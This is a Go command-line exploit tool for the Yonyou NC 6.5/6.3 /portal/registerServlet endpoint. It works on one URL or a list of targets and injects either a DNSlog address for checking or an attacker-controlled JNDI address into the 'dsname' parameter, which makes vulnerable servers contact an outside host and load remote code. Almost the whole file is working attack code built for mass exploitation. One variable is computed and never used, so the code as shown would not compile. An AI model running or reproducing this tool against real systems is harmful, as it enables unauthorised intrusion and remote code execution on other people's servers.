package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func usage() {
	fmt.Fprintf(os.Stderr, `用友nc 漏洞利用； 影响version: 用友nc 6.5 & 6.3
Usage: 	./main -u <url> -d <dnslog>
	./main -u <url> -j <jndi>
	./main -f <file> -d <dnslog>
	./main -f <file> -j <jndi>

Options:
`)
	flag.PrintDefaults()
}
func urlHandler(target string) string {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}
	if strings.HasSuffix(target, "/") {
		target = strings.TrimSuffix(target, "/")
		fmt.Println(target)
	}
	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("解析URL失败:", err)
		return target
	}
	targetURL.Path = ""
	target = targetURL.String()

	return target
}
func getStatusCode(url string) int {
	resp, err := http.Get(url)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	return resp.StatusCode
}
func readFile(filePath string) ([]string, error) {
	var lines []string
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// 使用dnslog漏洞验证：
func poc(target string, dnslog string) {
	vulurl := target + "/portal/registerServlet"
	fmt.Println("在执行：" + vulurl)

	data := fmt.Sprintf("type=1&dsname=%s", dnslog)
	req, err := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(data)))
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "null")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6")
	req.Header.Set("Cookie", "JSESSIONID=F93067EB562380A53F145E7724A1B127.server")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	// 发起请求：
	client := http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("发送请求失败:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}
	res := strings.Replace(string(body), "not", "", -1)
	res = strings.TrimSpace(res)
}

// 使用jndi漏洞利用
func exp(target string, jndi string) {
	// 创建请求
	vulurl := target + "/portal/registerServlet"
	fmt.Println("在执行：" + vulurl)
	data := fmt.Sprintf("type=1&dsname=%s/%s", jndi, target)
	req, err := http.NewRequest("POST", vulurl, bytes.NewReader([]byte(data)))
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "null")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6")
	req.Header.Set("Cookie", "JSESSIONID=F93067EB562380A53F145E7724A1B127.server")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")

	// 发起请求：
	client := http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("发送请求失败:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}
	res := strings.Replace(string(body), "not", "", -1)
	res = strings.TrimSpace(res)
}

func main() {
	var (
		url    string
		file   string
		dnslog string
		jndi   string
		h      bool
	)
	flag.StringVar(&url, "u", "", "url,单个URL")
	flag.StringVar(&file, "f", "", "file,url.txt,URL文件")
	flag.StringVar(&dnslog, "d", "", "DNS Log 使用dnslog验证漏洞")
	flag.StringVar(&jndi, "j", "", "JNDI 使用jndi脚本利用漏洞")
	flag.BoolVar(&h, "h", false, "this help")
	flag.Parse()

	if h {
		usage()
	}
	if url == "" && file == "" {
		usage()
		fmt.Println("请指定URL或URL文件")
		return
	}

	if url != "" && file != "" {
		usage()
		fmt.Println("URL和URL文件只能选择其中一个")
		return
	}
	if dnslog == "" && jndi == "" {
		usage()
		fmt.Println("请指定DNS或JNDI")
		return
	}else if dnslog != "" && jndi != "" {
		usage()
		fmt.Println("dnslog和jndi只能选择一个")
		return
	} 

	targets := []string{}
	if url != "" {
		targets = append(targets, url)
	} else if file != "" {
		lines, err := readFile(file)
		if err != nil {
			fmt.Println("读取URL文件失败:", err)
			return
		}
		targets = lines
	}
	for _, target := range targets {
		target = urlHandler(target)
		statusCode := getStatusCode(target)
		if statusCode == -1 {
			fmt.Println("无法访问URL:", target)
			continue
		} else if statusCode != 200 {
			fmt.Println("URL访问失败:", target, ", 状态码:", statusCode)
			continue
		}
		if dnslog != "" {
			poc(target, dnslog)
		} else if jndi != "" {
			exp(target, jndi)
		}
	}
}
